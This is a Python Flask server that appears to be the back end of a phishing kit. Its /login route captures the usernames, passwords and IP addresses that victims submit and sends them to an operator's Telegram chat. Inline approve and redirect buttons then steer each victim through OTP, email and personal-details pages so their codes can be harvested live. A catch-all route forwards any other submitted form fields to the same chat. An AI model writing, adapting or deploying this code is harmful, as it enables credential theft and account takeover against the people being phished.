from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import requests
import uuid
from dotenv import load_dotenv

# Load env vars
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID environment variables.")

app = Flask(__name__)
CORS(app)

# In-memory storage (use database for production)
user_status = {}  # { uuid: {'status': 'pending', 'redirect': None} }

# ========== Helpers ==========

def send_telegram_approval(login_id, password, user_ip, uid):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    buttons = [
        [
            {"text": "✅ Approve OTP", "callback_data": f"approve|{uid}|otp.html"},
            {"text": "📧 Email Page", "callback_data": f"approve|{uid}|email.html"},
        ],
        [
            {"text": "👤 Personal", "callback_data": f"approve|{uid}|personal.html"},
            {"text": "🔑 Login2", "callback_data": f"approve|{uid}|login2.html"},
        ],
        [
            {"text": "❌ Deny", "callback_data": f"deny|{uid}|error"}
        ]
    ]
    payload = {
        "chat_id": CHAT_ID,
        "text": f"<b>🔐 Login Attempt</b>\n<b>Login ID:</b> <code>{login_id}</code>\n<b>Password:</b> <code>{password}</code>\n<b>IP:</b> <code>{user_ip}</code>\n<b>UID:</b> <code>{uid}</code>",
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": buttons}
    }
    response = requests.post(url, json=payload)
    return response.ok

# ========== Routes ==========

@app.route("/", methods=["GET"])
def root():
    return "✅ Flask server is running."

@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.get_json()
        login_id = data.get("login")
        password = data.get("password")
        if not login_id or not password:
            return jsonify({"success": False, "error": "Missing fields"}), 400

        uid = str(uuid.uuid4())
        user_status[uid] = {"status": "pending", "redirect": None}
        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

        sent = send_telegram_approval(login_id, password, user_ip, uid)
        if not sent:
            return jsonify({"success": False, "error": "Telegram send failed"}), 500

        return jsonify({"success": True, "id": uid}), 200
    except Exception as e:
        print("Login error:", e)
        return jsonify({"success": False, "error": "Internal server error"}), 500

@app.route("/status/<uid>", methods=["GET"])
def check_status(uid):
    entry = user_status.get(uid)
    if not entry:
        return jsonify({"status": "invalid"}), 404
    if entry["status"] == "approved":
        return jsonify({"status": "approved", "redirect_url": entry["redirect"]}), 200
    elif entry["status"] == "denied":
        return jsonify({"status": "denied", "redirect_url": "error.html"}), 403
    return jsonify({"status": "pending"}), 200

@app.route("/webhook", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json()
        callback = data.get("callback_query", {})
        callback_data = callback.get("data", "")
        message = callback.get("message", {})
        chat_id = message.get("chat", {}).get("id")

        if "|" in callback_data:
            action, uid, target = callback_data.split("|")
            if uid in user_status:
                if action == "approve":
                    user_status[uid]["status"] = "approved"
                    user_status[uid]["redirect"] = target
                elif action == "deny":
                    user_status[uid]["status"] = "denied"
                    user_status[uid]["redirect"] = "error.html"

                # Acknowledge callback
                answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                requests.post(answer_url, json={"callback_query_id": callback["id"], "text": f"{action.title()}d!"})
        return jsonify({"ok": True})
    except Exception as e:
        print("Webhook error:", e)
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/<page>", methods=["POST"])
def generic_post(page):
    try:
        data = request.get_json() or request.form.to_dict()
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        msg = f"<b>{page.upper()} Submission</b>\n"
        msg += "\n".join([f"<b>{k}:</b> <code>{v}</code>" for k, v in data.items()])
        msg += f"\n<b>IP:</b> <code>{ip}</code>"

        send_telegram_approval("FORM", msg, ip, str(uuid.uuid4()))
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print("Form error:", e)
        return jsonify({"status": "error"}), 500

# ========== Start ==========
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)